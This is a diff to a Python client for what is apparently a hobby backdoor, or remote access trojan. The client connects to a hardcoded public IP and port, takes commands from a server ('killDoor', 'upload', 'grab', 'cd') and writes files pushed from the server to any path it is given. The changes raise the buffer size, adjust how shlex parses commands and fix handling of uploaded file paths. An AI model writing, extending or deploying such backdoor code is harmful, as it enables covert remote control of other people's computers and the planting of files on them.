@@ -7,7 +7,7 @@ import shlex
 ADDR = '23.123.182.6'#my public facing IPv4. If you are looking to test this dr. use loopback.
 PORT = 7771 #only open when im running server
 CWD = os.getcwd()
-BYTEBUFFER = 4096
+BYTEBUFFER = 8096
 SPLITTER = b"<<<Split>>>"
 
 class Client:
@@ -25,7 +25,7 @@ class Client:
                     servCom = soc.recv(BYTEBUFFER)
                     #print(len(servCom))
                     servCom = servCom.decode()
-                    servComArr = shlex.split(servCom)
+                    servComArr = shlex.split(servCom, posix=False)
                     print("Received command: " + str(servCom) + f"\n{servComArr}")
                     #custom command checking
                     if servCom == 'killDoor':
@@ -37,16 +37,14 @@ class Client:
                     #server is initiating transfer
                     elif servComArr[0] == "upload":
                         fileLocation = servComArr[1]
+                        fileLocation = fileLocation.replace("\\\\", "\\").replace('"', '')#fix any shlex issues
+                        print("This is the replace: " + fileLocation)
                         fileSizeBytes = int(servComArr[2])
                         fileChunks = int(servComArr[3])
                         with open(fileLocation, 'wb') as outFile:
                             outFile.write(soc.recv(fileSizeBytes, socket.MSG_WAITALL))#oh my this took so long to figure out
-                            #for x in range(fileChunks):#all but last offsized chunk
-                            #    outFile.write(soc.recv(BYTEBUFFER))
-                            #remainingBytes = fileSizeBytes-(BYTEBUFFER*(fileChunks-1))
-                            #outFile.write(soc.recv(remainingBytes))
                             outFile.close()
-                        soc.sendall(b'\nfile was successfully uploaded to remote.')
+                        soc.sendall(b'\nfile was successfully uploaded to remote.')#acts as an ack message
                     elif servComArr[0] == 'grab':
                         print()
                     elif servComArr[0] == 'cd':
